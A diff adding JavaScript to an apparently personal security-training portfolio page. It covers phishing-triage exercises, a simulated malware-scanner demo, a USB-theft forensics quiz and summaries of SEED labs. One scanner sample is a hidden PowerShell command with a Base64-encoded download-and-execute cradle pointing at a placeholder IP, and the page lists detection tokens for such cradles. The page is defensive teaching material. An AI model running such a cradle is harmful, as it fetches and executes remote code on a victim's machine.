+          ['Subject',P('Action required: mailbox storage full',false,'A generic IT subject. Suspicious in context, but not proof by itself.','Subject line')],
+          ['Auth',P('spf=fail · dkim=none · dmarc=fail',true,'The domain\'s own policy rejects this sender. Strong sign of spoofing.','Authentication failed')]],
+     body:[['p',[P('Dear user,',true,'No name. Real IT systems address you by name; mass phishing can\'t.','Generic greeting')]],
+           ['p',[P('Your mailbox has exceeded its storage limit. ',false,'Plausible claim that sets up the request.','Pretext'),P('Your account will be locked in 2 hours',true,'A short deadline pressures you to act before thinking.','False urgency'),P(' unless you verify your credentials now.',false,'The ask: your password.','Request')]],
+           ['btn',P('Verify on outlook.office.com',true,'The button text names Microsoft, but the real link is hxxp://198.51.100.77/owa/login.php, a bare IP with no HTTPS.','Link text vs. real URL')],
+           ['att',P('📎 Storage_Upgrade_Form.html',true,'An HTML attachment can open a fake login page locally and bypass URL filters.','HTML attachment')]],
+     playbook:['Block the sender domain and the URL at the email gateway','Search the SIEM for every recipient and anyone who clicked','Reset passwords and revoke sessions for anyone who entered credentials','Add the domain, IP, and attachment hash to the IOC watchlist','Thank the reporter. Reporting is the behavior to reward.']},
+    {name:'Open enrollment reminder', answer:'legit',
+     hdr:[['From',P('Northwind Health HR <benefits@northwind-health.org>',false,'Your own organization\'s real domain, spelled correctly.','Sender checks out')],
+          ['Reply-To',P('(none)',false,'No Reply-To redirect. Replies go back to HR.','No redirect')],
+          ['To',P('you@northwind-health.org',false,'Your correct address.','Recipient')],
+          ['Subject',P('Reminder: benefits open enrollment closes Nov 15',false,'A routine HR topic at the right time of year.','Subject line')],
+          ['Auth',P('spf=pass · dkim=pass · dmarc=pass',false,'All checks pass for your own domain.','Authentication passes')]],
+     body:[['p',[P('Hi Jordan,',false,'Addressed by name.','Personal greeting')]],
+           ['p',[P('Open enrollment closes on November 15. ',false,'A real, weeks-away deadline. Deadlines alone aren\'t red flags.','Normal deadline'),P('You can review your plans any time in the HR portal.',false,'It points you to a portal you already use and doesn\'t ask for a password in email.','No credential request')]],
+           ['btn',P('Open the HR portal',false,'The link goes to https://hr.northwind-health.org/benefits, which matches your organization\'s domain.','Link matches text')],
+           ['p',[P('Questions? Call the HR line at ext. 4410.',false,'Offers a way to verify through another channel.','Out-of-band contact')]]],
+     playbook:['Mark as legitimate and close the ticket','Thank the reporter and let them know it was safe','Note the sender as known-good to reduce future false positives']},
+    {name:'Quick favor from the CFO', answer:'bec',
+     hdr:[['From',P('Dana Whitfield <dana.whitfield.cfo@gmail.com>',true,'The display name is an executive, but the address is a personal Gmail account, not the company domain.','Executive name on free-mail')],
+          ['Reply-To',P('(none)',false,'No redirect. The attacker controls this Gmail account directly.','No redirect')],
+          ['To',P('you@northwind-health.org',false,'Your correct address.','Recipient')],
+          ['Subject',P('Are you at your desk?',false,'A short, vague opener meant to start a conversation.','Subject line')],
+          ['Auth',P('spf=pass · dkim=pass (gmail.com)',false,'Passes because Gmail really sent it. Authentication proves the domain, not the person. Don\'t let a pass fool you.','Authentication passes (trap)')]],
+     body:[['p',[P('I need a quick favor. ',false,'Friendly and casual, typical BEC opener.','Opener'),P('I\'m stuck in a board meeting and can\'t talk, so please keep this between us.',true,'Secrecy plus unavailability stops you from verifying by phone.','Secrecy and no call-back')]],
+           ['p',[P('Please buy 5 gift cards at $200 each for a client appreciation event.',true,'Gift cards are untraceable cash. No real executive asks for them by email.','Gift card request'),P(' Scratch the backs and reply with the codes within the hour.',true,'Sending codes by email is the payout. Plus a time pressure.','Payment by reply')]],
+           ['p',[P('Thanks, Dana. Sent from my iPhone',false,'Excuses short, typo-prone writing. Common, but not proof alone.','Signature')]]],
+     playbook:['Do not reply. Verify by calling the CFO on a known number','Report to the security team and block the Gmail address','Search for the same sender across other employees','Brief finance and executive assistants on the active BEC campaign']}
+  ];
+  const VERD=[['legit','Legitimate'],['spam','Spam / marketing'],['phish','Credential phishing'],['bec','BEC / payment fraud']];
+  const ps=EMAILS.map(()=>({seen:new Set(),verdict:null}));
+  let pi=0;
+  function partHTML(p,id,cls=''){const s=ps[pi];const seen=s.seen.has(id);const c=seen?(p.flag?'hit':'ok'):'';return `<button class="part ${cls} ${c}" data-id="${id}">${esc(p.text)}</button>`;}
+  function renderPh(){
+    const em=EMAILS[pi], s=ps[pi];
+    $('#phTabs').innerHTML=EMAILS.map((e,i)=>`<button aria-current="${i===pi}" data-i="${i}">${ps[i].verdict?(ps[i].verdict===e.answer?'<span class="ok">✓</span>':'<span style="color:var(--sev-high)">✗</span>'):`<span class="mono">${i+1}</span>`} ${esc(e.name)}</button>`).join('')+`<span class="mono muted" style="font-size:.74rem;margin-left:auto">Score: ${ps.filter((x,i)=>x.verdict===EMAILS[i].answer).length}/3</span>`;
+    let h='<div class="hdr">'+em.hdr.map((r,i)=>`<span>${r[0]}</span><span>${partHTML(r[1],'h'+i)}</span>`).join('')+'</div><div class="body">';
+    em.body.forEach((b,i)=>{
+      if(b[0]==='p') h+='<p>'+b[1].map((p,j)=>partHTML(p,'b'+i+'_'+j)).join('')+'</p>';
+      if(b[0]==='btn'){const id='b'+i;const seen=s.seen.has(id);h+=`<button class="part ebtn ${seen?(b[1].flag?'hit':'ok'):''}" data-id="${id}">${esc(b[1].text)}</button>`;}
+      if(b[0]==='att'){h+=`<div>${partHTML(b[1],'b'+i,'att')}</div>`;}
+    });
+    $('#phEmail').innerHTML=h+'</div>';
+    const all=allParts(em), flags=all.filter(x=>x.p.flag), found=flags.filter(x=>s.seen.has(x.id)).length;
+    $('#phCount').textContent=`${found}/${flags.length} red flags found`;
+    const notes=[...s.seen].map(id=>all.find(x=>x.id===id)).filter(Boolean);
+    $('#phNotes').innerHTML=notes.length?notes.slice().reverse().map(x=>`<div class="note ${x.p.flag?'r':'g'}"><b>${x.p.flag?'🚩 ':'✓ '}${esc(x.p.title)}</b>${esc(x.p.note)}</div>`).join(''):'<p class="muted" style="font-size:.86rem">Click any part of the email to inspect it. Notes appear here.</p>';
+    $('#phVerdicts').innerHTML=VERD.map(([k,l])=>{let c='';if(s.verdict){if(k===em.answer)c='right';else if(k===s.verdict)c='wrong';}return `<button data-v="${k}" class="${c}" ${s.verdict?'disabled':''}>${l}</button>`;}).join('');
+    if(s.verdict){
+      const right=s.verdict===em.answer, ans=VERD.find(v=>v[0]===em.answer)[1];
+      $('#phResult').innerHTML=`<div class="feedback ${right?'good':'bad'}"><b>${right?'Correct: '+ans+'.':'Not quite. This is '+ans+'.'}</b>${flags.length?`Red flags: ${flags.map(x=>x.p.title).join(', ')}.`:'No red flags. Calling this phishing would be a false positive that wastes analyst time and teaches users to ignore real HR mail.'}</div>
+        <h4 style="margin-top:12px;margin-bottom:6px">Response playbook</h4><ol class="playbook">${em.playbook.map(x=>`<li>${esc(x)}</li>`).join('')}</ol>
+        <div style="margin-top:12px">${pi<EMAILS.length-1?'<button class="btn sm primary" id="phNext">Next email →</button>':`<span class="mono">Final score: ${ps.filter((x,i)=>x.verdict===EMAILS[i].answer).length}/3</span> <button class="btn sm" id="phRestart">Start over</button>`}</div>`;
+    } else $('#phResult').innerHTML='';
+  }
+  function allParts(em){const a=[];em.hdr.forEach((r,i)=>a.push({id:'h'+i,p:r[1]}));em.body.forEach((b,i)=>{if(b[0]==='p')b[1].forEach((p,j)=>a.push({id:'b'+i+'_'+j,p}));else a.push({id:'b'+i,p:b[1]});});return a;}
+  $('#phEmail').addEventListener('click',e=>{const b=e.target.closest('.part');if(!b)return;ps[pi].seen.add(b.dataset.id);renderPh();});
+  $('#phTabs').addEventListener('click',e=>{const b=e.target.closest('button');if(b){pi=+b.dataset.i;renderPh();}});
+  $('#phVerdicts').addEventListener('click',e=>{const b=e.target.closest('button');if(b&&!ps[pi].verdict){ps[pi].verdict=b.dataset.v;renderPh();}});
+  $('#phResult').addEventListener('click',e=>{if(e.target.id==='phNext'){pi++;renderPh();}if(e.target.id==='phRestart'){ps.forEach(x=>{x.seen.clear();x.verdict=null;});pi=0;renderPh();}});
+  $('#phHint').addEventListener('click',()=>{
+    const em=EMAILS[pi], s=ps[pi]; const left=allParts(em).filter(x=>x.p.flag&&!s.seen.has(x.id));
+    if(!left.length){$('#phNotes').insertAdjacentHTML('afterbegin',`<div class="note g"><b>Hint</b>${allParts(em).some(x=>x.p.flag)?'You found every red flag. Pick a verdict.':'Look closely: everything here may check out. Not every reported email is malicious.'}</div>`);return;}
+    const el=$(`#phEmail [data-id="${left[0].id}"]`); el.classList.remove('hint'); void el.offsetWidth; el.classList.add('hint'); el.focus();
+  });
+  renderPh();
+
+  /* ---------- Malware scanner ---------- */
+  /* EICAR test string, assembled at runtime so the page source itself never trips antivirus scanners */
+  const EICAR_TAG=['EICAR','STANDARD','ANTIVIRUS','TEST','FILE'].join('-');
+  const EICAR='X5O!P%@AP[4\\PZX54(P^)7CC)7}$'+EICAR_TAG+'!$H+H*';
+  const SAMPLES=[
+    {id:'eicar',name:'eicar_test.com',desc:'Antivirus test file',content:EICAR,vt:[61,72],clam:'Win.Test.EICAR_HDB-1 FOUND',strings:[]},
+    {id:'pdf',name:'Q3_report.pdf',desc:'Ordinary document',content:'%PDF-1.4\n% Quarterly report draft. Revenue summary and staffing notes.\n%%EOF',vt:[0,72],clam:'OK',strings:[]},
+    {id:'ps1',name:'invoice_update.ps1',desc:'Script from an email',content:'powershell -NoP -W Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADcANwAvAGEAJwApAA==',vt:[9,72],clam:'OK (no signature match)',strings:['-EncodedCommand','-W Hidden','-NoP']}
+  ];
+  let scSel='eicar', userFile=null, scanning=false;
+  function renderSamples(){
+    $('#scSamples').innerHTML=SAMPLES.map(s=>`<button aria-pressed="${scSel===s.id}" data-s="${s.id}"><b>${s.name}</b><span>${s.desc}</span></button>`).join('')+
+      `<label class="${scSel==='user'?'sel':''}"><input type="file" id="scFile"><b>${userFile?esc(userFile.name):'Your own file'}</b><span>${userFile?(userFile.size.toLocaleString()+' bytes · hashed locally'):'Choose a file to hash locally'}</span></label>`;
+  }
+  $('#scSamples').addEventListener('click',e=>{const b=e.target.closest('button');if(b){scSel=b.dataset.s;renderSamples();}});
+  $('#scSamples').addEventListener('change',e=>{if(e.target.id==='scFile'&&e.target.files[0]){userFile=e.target.files[0];scSel='user';renderSamples();}});
+  async function sha256(buf){try{const h=await crypto.subtle.digest('SHA-256',buf);return [...new Uint8Array(h)].map(b=>b.toString(16).padStart(2,'0')).join('');}catch(e){return 'unavailable in this browser';}}
+  const wait=ms=>new Promise(r=>setTimeout(r,reduce?0:ms));
+  $('#scRun').addEventListener('click',async()=>{
+    if(scanning) return; scanning=true; $('#scRun').disabled=true;
+    const steps=$$('#scPipe .step'); steps.forEach(s=>s.classList.remove('active','done'));
+    const out=$('#scOut'); const rep=$('#scReport'); rep.innerHTML='<p class="muted" style="font-size:.88rem">Scanning…</p>';
+    let name,buf,text,meta;
+    if(scSel==='user'){ if(!userFile){out.textContent='Choose a file first.';scanning=false;$('#scRun').disabled=false;return;} name=userFile.name; buf=await userFile.arrayBuffer(); text=new TextDecoder('latin1').decode(buf.slice(0,4096)); meta=null; }
+    else { meta=SAMPLES.find(s=>s.id===scSel); name=meta.name; buf=new TextEncoder().encode(meta.content).buffer; text=meta.content; }
+    const step=async(i,line,ms=500)=>{steps.forEach((s,k)=>{s.classList.toggle('active',k===i);if(k<i)s.classList.add('done');});out.textContent+=(out.textContent?'\n':'')+line;await wait(ms);};
+    out.textContent='';
+    await step(0,`$ python scanner.py ${name}\n[intake]  ${name} · ${buf.byteLength.toLocaleString()} bytes`);
+    const hash=await sha256(buf);
+    await step(1,`[hash]    sha256 = ${hash}`);
+    const eicarHit=text.includes(EICAR_TAG);
+    const clam=meta?meta.clam:(eicarHit?'Win.Test.EICAR_HDB-1 FOUND':'OK (no signature match)');
+    await step(2,`[clamav]  ${name}: ${clam}`);
+    let vtLine; if(meta) vtLine=`[vt]      ${meta.vt[0]}/${meta.vt[1]} engines flag this hash (sample result)`; else vtLine='[vt]      lookup skipped in this demo · the real tool sends only the hash, never the file';
+    await step(3,vtLine);
+    const sus=meta?meta.strings:['-EncodedCommand','DownloadString','IEX','Invoke-Expression','-W Hidden'].filter(x=>text.includes(x));
+    if(sus.length) await step(3,`[strings] suspicious tokens: ${sus.join(', ')}`,350);
+    let verdict,cls;
+    if(clam.includes('FOUND')||(meta&&meta.vt[0]>=20)) {verdict='MALICIOUS';cls='high';}
+    else if(sus.length||(meta&&meta.vt[0]>0)) {verdict='SUSPICIOUS';cls='med';}
+    else {verdict=meta?'CLEAN':'NO DETECTION';cls='low';}
+    await step(4,`[report]  verdict: ${verdict}\ndone.`,200);
+    steps.forEach(s=>{s.classList.remove('active');s.classList.add('done');});
+    const ratio=meta?meta.vt[0]/meta.vt[1]:0;
+    const why = verdict==='MALICIOUS'?(eicarHit||scSel==='eicar'?'ClamAV matched the EICAR test signature. This file is harmless by design, but the pipeline treats it exactly like real malware, which proves detection works end to end.':'Signature and reputation both agree.')
+      : verdict==='SUSPICIOUS'?'No ClamAV signature matched, but the script hides its window and runs a Base64-encoded command that downloads code. Signature scanning alone would have missed this. Reputation and behavior checks caught it.'
+      : meta?'No signature match and no engines flag this hash. Safe to release.':'No signature match in the local check. The real pipeline would also check VirusTotal reputation before clearing it.';
+    rep.innerHTML=`<span class="verdict-badge sev ${cls}" style="font-size:1.2rem">${verdict}</span>
+      <div class="kv" style="margin-top:12px"><span>File</span><span class="mono" style="font-size:.78rem;overflow-wrap:anywhere">${esc(name)}</span><span>SHA-256</span><span class="mono" style="font-size:.72rem;overflow-wrap:anywhere">${hash}</span><span>ClamAV</span><span>${esc(clam)}</span></div>
+      ${meta?`<div class="vbar ${ratio===0?'clean':''}"><span>VirusTotal</span><div class="bar"><i style="width:${Math.max(ratio*100,2)}%"></i></div><span class="mono">${meta.vt[0]}/${meta.vt[1]}</span></div>`:''}
+      <p style="font-size:.86rem;margin-top:12px">${why}</p>`;
+    scanning=false; $('#scRun').disabled=false;
+  });
+  renderSamples();
+
+  /* ---------- Forensics case ---------- */
+  const TL=[
+    {id:1,t:'2026-03-02 13:58:20',src:'Event Log',ev:'User jdoe logs on to workstation FIN-WS-07 (logon type 2, interactive)'},
+    {id:2,t:'2026-03-02 14:03:11',src:'USB Registry',ev:'USB device "SanDisk Ultra" (serial 4C53…) first connected, mounted as E:'},
+    {id:3,t:'2026-03-02 14:05:40',src:'Jump List',ev:'Excel opened E:\\Finance\\Q3_Payroll.xlsx'},
+    {id:4,t:'2026-03-02 14:06:02',src:'LNK File',ev:'Shortcut created for Q3_Payroll.xlsx in Recent Items'},
+    {id:5,t:'2026-03-02 14:07:15',src:'Jump List',ev:'Excel opened C:\\Users\\jdoe\\Documents\\Q3_Payroll_copy.xlsx'},
+    {id:6,t:'2026-03-02 14:09:27',src:'ShellBags',ev:'User browsed E:\\Backup_new\\ (folder first seen)'},
+    {id:7,t:'2026-03-02 14:11:58',src:'Autopsy',ev:'Q3_Payroll_copy.xlsx deleted from Documents; recovered from unallocated space'},
+    {id:8,t:'2026-03-02 14:12:30',src:'USB Registry',ev:'Device E: last removal time'},
+    {id:9,t:'2026-03-02 14:15:03',src:'Event Log',ev:'User jdoe logs off'}
+  ];
+  const QS=[
+    {q:'When was the USB drive first connected?',a:2,why:'USB registry keys record the first connection time for each device serial.'},
+    {q:'Which payroll file did the user open directly from the USB drive?',a:3,why:'The Jump List entry shows Excel opening a file on E:, the USB drive.'},
+    {q:'What shows the user tried to cover their tracks?',a:7,why:'Autopsy recovered a deleted copy of the payroll file from unallocated space minutes before the drive was removed.'}
+  ];
+  let tf='All', tq='', qi=0; const wrongRow={};
+  const srcs=['All',...new Set(TL.map(r=>r.src))];
+  function renderTL(){
+    $('#tlFilters').innerHTML=srcs.map(s=>`<button class="chip" data-s="${s}" aria-pressed="${s===tf}">${s}</button>`).join('');
+    const rows=TL.filter(r=>(tf==='All'||r.src===tf)&&(!tq||(r.ev+r.src+r.t).toLowerCase().includes(tq)));
+    $('#tlBody').innerHTML=rows.map(r=>{const solved=QS.some((q,i)=>i<qi&&q.a===r.id);return `<tr tabindex="0" data-id="${r.id}" class="${solved?'right':(wrongRow[r.id]?'wrong':'')}"><td>${r.t}</td><td><span class="src">${r.src}</span></td><td>${esc(r.ev)}</td></tr>`;}).join('')||'<tr><td colspan="3" class="muted">No events match.</td></tr>';
+    $('#tlQs').innerHTML=QS.map((q,i)=>`<div class="q ${i===qi?'active':''} ${i<qi?'solved':''}"><b>Q${i+1}. ${esc(q.q)}</b>${i<qi?`<span class="ans">${esc(q.why)}</span>`:(i===qi?'<span class="ans">Click the row in the timeline that proves it.</span>':'')}</div>`).join('')+
+      (qi>=QS.length?`<div class="feedback good"><b>Case closed.</b>jdoe connected a personal USB drive, opened the payroll file from it, made a local copy, then deleted the copy and removed the drive. Recommendation: escalate to HR and legal, preserve the image and drive serial as evidence, and review DLP rules for removable media.</div><button class="btn sm" id="tlReset">Reset case</button>`:'');
+  }
+  function pick(id){
+    if(qi>=QS.length) return;
+    if(QS[qi].a===id){qi++;Object.keys(wrongRow).forEach(k=>delete wrongRow[k]);}
+    else {wrongRow[id]=true;}
+    renderTL();
+  }
+  $('#tlBody').addEventListener('click',e=>{const r=e.target.closest('tr[data-id]');if(r)pick(+r.dataset.id);});
+  $('#tlBody').addEventListener('keydown',e=>{if(e.key==='Enter'||e.key===' '){const r=e.target.closest('tr[data-id]');if(r){e.preventDefault();pick(+r.dataset.id);}}});
+  $('#tlFilters').addEventListener('click',e=>{const b=e.target.closest('.chip');if(b){tf=b.dataset.s;renderTL();}});
+  $('#tlSearch').addEventListener('input',e=>{tq=e.target.value.toLowerCase();renderTL();});
+  $('#tlQs').addEventListener('click',e=>{if(e.target.id==='tlReset'){qi=0;tf='All';tq='';$('#tlSearch').value='';renderTL();}});
+  renderTL();
+
+  /* ---------- SEED labs ---------- */
+  const LABS=[
+    {wk:'Week 1',cat:'System',name:'Environment Variable & Set-UID',atk:'Trick a privileged Set-UID program into running attacker code through PATH and LD_PRELOAD.',did:'Built a malicious library and binary, then showed how a root-owned program loaded them.',def:'Audit Set-UID binaries (find / -perm -4000), never trust PATH in privileged code.',det:'New Set-UID files, unusual LD_PRELOAD in process environments.'},
+    {wk:'Week 4',cat:'Forensics',name:'Autopsy Investigation Project',atk:'Not an attack: a full investigation of a disk image.',did:'Recovered deleted files, built a timeline, and reported findings.',def:'Preserve images with hashes so evidence holds up.',det:'Turns raw disk data into a timeline for incident response.'},
+    {wk:'Week 5',cat:'System',name:'Meltdown',atk:'Read kernel memory from user space through a CPU side channel.',did:'Measured cache timing to leak a secret byte by byte.',def:'Keep kernel and microcode patched (KPTI).',det:'Hard to see in logs, so patch compliance is the control.'},
+    {wk:'Week 6',cat:'System',name:'Spectre',atk:'Abuse speculative execution to leak data across a security boundary.',did:'Trained the branch predictor to read out-of-bounds memory.',def:'Compiler and browser mitigations, timely patching.',det:'Track vulnerable CPU and firmware versions in the asset inventory.'},
+    {wk:'Week 7',cat:'Crypto',name:'TLS',atk:'Break TLS trust through bad certificate validation or a man-in-the-middle position.',did:'Built TLS clients and servers and tested what happens when validation is skipped.',def:'Enforce hostname and chain validation, and pin where it fits.',det:'Unexpected certificates or issuers in proxy and TLS logs.'},
+    {wk:'Week 8',cat:'Crypto',name:'PKI',atk:'Use a rogue certificate authority to impersonate a site.',did:'Created a CA, issued certificates, and saw how browser trust works.',def:'Control trusted root stores and monitor Certificate Transparency.',det:'Certificates from unknown CAs for company domains.'},
+    {wk:'Week 9',cat:'Crypto',name:'RSA Encryption & Signature',atk:'Understand how RSA keys, encryption, and signatures can fail.',did:'Generated keys and encrypted, decrypted, signed, and verified by hand.',def:'Use vetted libraries, adequate key sizes, and proper padding.',det:'Weak key sizes found in scans and config audits.'},
+    {wk:'Week 10',cat:'Crypto',name:'MD5 Collision',atk:'Create two different programs with the same MD5 hash.',did:'Generated colliding files that behave differently.',def:'Never use MD5 for integrity. Use SHA-256.',det:'Flag MD5-only integrity checks in code and vendor tools.'},
+    {wk:'Week 11',cat:'Crypto',name:'Hash Length Extension',atk:'Forge a valid MAC by extending a message hashed as hash(secret + message).',did:'Appended data to a signed API request without knowing the key.',def:'Use HMAC, not homemade hash-based MACs.',det:'Odd padding bytes and appended parameters in API requests.'},
+    {wk:'Week 12',cat:'Crypto',name:'Secret-Key Encryption',atk:'Show how ECB mode and IV reuse leak information.',did:'Encrypted images in ECB and watched the picture survive encryption.',def:'Use authenticated modes like AES-GCM with unique IVs.',det:'Config review for weak cipher modes.'},
+    {wk:'Week 13',cat:'Network',name:'Random Numbers & Heartbleed',atk:'Predict weak random keys, and leak server memory through the Heartbleed bug.',did:'Exploited a vulnerable OpenSSL heartbeat to read memory.',def:'Use a CSPRNG and patch OpenSSL.',det:'Oversized TLS heartbeat responses, which IDS signatures catch.'},
+    {wk:'Week 14',cat:'Network',name:'Morris Worm (team project)',atk:'Self-propagating code that spreads host to host.',did:'Rebuilt the worm\'s propagation across Docker containers in the VM.',def:'Segmentation, patching, and egress filtering stop the spread.',det:'Sudden fan-out of connections from one host to many.'},
+    {wk:'Week 14',cat:'System',name:'Android Repackaging & Rooting',atk:'Inject malicious code into a legitimate app and gain root.',did:'Repackaged an APK with a payload and studied the rooting process.',def:'Install only from trusted stores, enforce MDM and app signing.',det:'Unknown signing certificates and rooted-device flags in MDM.'}
+  ];
+  let sf='All';
+  function renderSeed(){
+    $('#seedFilter').innerHTML=['All','System','Crypto','Network','Forensics'].map(c=>`<button class="chip" data-c="${c}" aria-pressed="${c===sf}">${c}</button>`).join('');
+    $('#seedGrid').innerHTML=LABS.filter(l=>sf==='All'||l.cat===sf).map(l=>`<details class="lab"><summary><span class="wk">${l.wk}</span><b>${esc(l.name)}</b><span class="plus">+</span></summary><div class="lb"><div><b>The attack</b>${esc(l.atk)}</div><div><b>What the lab involves</b>${esc(l.did)}</div><div><b>Defense</b>${esc(l.def)}</div><div><b>How a SOC would spot it</b>${esc(l.det)}</div></div></details>`).join('');
+  }
+  $('#seedFilter').addEventListener('click',e=>{const b=e.target.closest('.chip');if(b){sf=b.dataset.c;renderSeed();}});
+  renderSeed();
+
+  /* ---------- Copy email ---------- */
+  $$('.copy').forEach(cb=>cb.addEventListener('click',()=>{const txt=cb.dataset.copy; const span=cb.previousElementSibling;
+    const done=()=>{cb.textContent='Copied';setTimeout(()=>cb.textContent='Copy',1600);};
+    const fb=()=>{const r=document.createRange();r.selectNodeContents(span);const sel=getSelection();sel.removeAllRanges();sel.addRange(r);cb.textContent='Selected';setTimeout(()=>cb.textContent='Copy',1600);};
+    try{navigator.clipboard.writeText(txt).then(done,fb);}catch(e){fb();}}));
+})();
+</script>
 
 </body>
 </html>
